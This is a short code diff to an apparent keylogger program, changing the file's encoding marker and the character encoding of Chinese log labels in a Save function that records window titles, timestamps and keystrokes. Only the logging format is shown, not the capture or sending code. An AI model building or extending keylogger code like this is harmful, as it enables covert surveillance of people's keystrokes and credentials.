@@ -1,4 +1,4 @@
-#include "keylogger.h"
+ï»¿#include "keylogger.h"
 #include <cstring>
 #include <cstdio>
 #include <time.h>
@@ -107,7 +107,7 @@ int Save(int key_stroke)
             sprintf_s(tm, "%d-%02d-%02d  %02d:%02d:%02d", s.wYear, s.wMonth, s.wDay,
                       s.wHour, s.wMinute, s.wSecond);
 
-            output << "\r\n\r\n[±êÌâ:] " << window_title << "\r\n[Ê±¼ä:]" << tm << "\r\n[ÄÚÈÝ:]";
+            output << "\r\n\r\n[æ ‡é¢˜:] " << window_title << "\r\n[æ—¶é—´:]" << tm << "\r\n[å†…å®¹:]";
         }
     }
 
